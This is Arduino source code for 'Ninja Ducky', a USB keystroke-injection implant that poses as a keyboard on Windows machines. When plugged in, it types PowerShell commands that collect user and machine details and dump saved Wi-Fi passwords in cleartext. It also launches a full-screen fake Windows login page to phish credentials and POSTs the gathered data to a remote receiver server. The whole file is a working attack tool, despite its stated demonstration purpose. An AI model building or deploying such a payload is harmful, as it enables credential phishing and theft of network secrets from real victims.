/*
NINJA DUCKY V1.3
A collection of scripts designed to exfiltrate data using a HID USB implant sending securely to a remote web server for the purposes of demonstration and security hardening.
This script makes use of the Windows10-Login-Screen-HTML project here: https://github.com/p0ep0e/Windows10-Login-Screen-HTML

Author: Bob McKay
August 2022
GitHub: https://github.com/p0ep0e/ninja-ducky-toolkit
*/

#include <avr/pgmspace.h>
#include "DigiKeyboard.h" //A UK version of the library is available here: https://github.com/p0ep0e/DigiKeyboardUK

const char str1[] PROGMEM = "mkdir Duck; cd Duck; mkdir Sys; mkdir Wifi; cd Sys; gatherNetworkInfo.vbs";
const char str2[] PROGMEM = "$machineName = $env:computername;$dom = $env:userdomain; $usr = $env:username; $user = (Get-ChildItem \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\SessionData\\\" | Get-ItemProperty | Where-Object LoggedOnUser -like \"$(whoami)\" | select -First 1)";
const char str3[] PROGMEM = "if ((Get-Item $user.PSPath).Property -contains \"LoggedOnDisplayName\" -eq $true){$displayName = $user.LoggedOnDisplayName} else {$displayName = $user.LoggedOnUser | %{$_.Split(\"\\\")[1]}}";
const char str4[] PROGMEM = "$duckyToken='rIZKcAdzYhywSrkBrkBgh'"; //This token needs to be reflected in the NinjaDuckyReciever.php file to authorise the data receipt and the Windows10-Login-Screen receiver if you choose to use that too.
const char str5[] PROGMEM = "Start-Process \"https://yourDomain.com/scripts/winLoginPage.php?machineName=$machineName&displayName=$displayName&userName=$usr&duckyToken=$duckyToken\"";
const char str6[] PROGMEM = "cd ../Wifi; netsh wlan export profile key=clear";
const char str7[] PROGMEM = "Get-Content *.xml | Set-Content wificnf.txt; $wifi = Get-Content wificnf.txt -Raw";
const char str8[] PROGMEM = "cd ../Sys/config; $os = Get-Content osinfo.txt -Raw;$env = Get-Content envinfo.txt -Raw;$nearby = Get-Content Neighbors.txt -Raw;$smb = Get-Content FileSharing.txt -Raw";
const char str9[] PROGMEM = "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://yourDomain.com/scripts/NinjaDuckyReceiver.php -Method POST -Body @{duckyToken=$duckyToken;wifiPwds=$wifi;osInfo=$os;smbInfo=$smb;envInfo=$env;nearby=$nearby}";


char buffer[285]; // Buffer must be length of longest string + 1
#define GetStr(x) (strcpy_P(buffer, (char*)x))

void printText( char * txt ) {
  int stringLength = strlen(txt);
  for (int currentChar = 0; currentChar < stringLength; currentChar++) {
    DigiKeyboard.print( txt[currentChar] );
    DigiKeyboard.update();
  }
}

void setup() {
}

void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);//Minimise all windows so we can use ALT-TAB later and if the user has a dual screen, it makes the fake login screen more effective.
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//Open Run Box
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(42);//Backspace in case the run box has a command already in it
DigiKeyboard.delay(200);
DigiKeyboard.print("powershell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000);
printText(GetStr (str1)); //mkdir Duck; cd Duck; mkdir Sys; mkdir Wifi; cd Sys; gatherNetworkInfo.vbs
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000); 

printText(GetStr (str2));  //Gather variables for the mock login screen such as username, machine name and domain
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
printText(GetStr (str3));
DigiKeyboard.sendKeyStroke(KEY_ENTER); //Gather users display name for the mock login screen
DigiKeyboard.delay(500);

printText(GetStr (str4)); //Set DuckyToken used by recieving scripts.
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(150);

printText(GetStr (str5));
DigiKeyboard.sendKeyStroke(KEY_ENTER);  //Launch the mock login screen in the default browser (doing it here instead of at the end makes use of the delay to give gatherNetworkInfo.vbs time to run
DigiKeyboard.delay(6000);
DigiKeyboard.sendKeyStroke(68);//Make the fake login screen fullscreen (F11)
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); //ALT TAB TO SWITCH BACK TO THE POWERSHELL
DigiKeyboard.delay(1000);
printText(GetStr (str6));//cd ../Wifi; netsh wlan export profile key=clear
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
printText(GetStr (str7));//Get-Content *.xml | Set-Content wificnf.txt; $wifi = Get-Content wificnf.txt -Raw
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
printText(GetStr (str8));//cd ../Sys/config; $os = Get-Content osinfo.txt -Raw;$env = Get-Content envinfo.txt -Raw;$nearby = Get-Content Neighbors.txt -Raw;$smb = Get-Content FileSharing.txt -Raw
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(150);
printText(GetStr (str9));//Submit the gathered data to our remote receiver: $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://yourDomain.com/scripts/NinjaDuckyReceiver.php -Method POST -Body @{duckyToken=$duckyToken;wifiPwds=$wifi;osInfo=$os;smbInfo=$smb;envInfo=$env;nearby=$nearby}
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5000);
DigiKeyboard.print("exit");//Exit the PowerShell windows, active window become the browser with the fake login screen
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);



int i =5000;
while (i > 0) { //Flash LEDs
i--;
digitalWrite(0, HIGH);
digitalWrite(1, HIGH);
delay(500);
digitalWrite(0, LOW);
digitalWrite(1, LOW);
delay(500);
}
  exit(0);  //Exit the loop to prevent it running again.
}
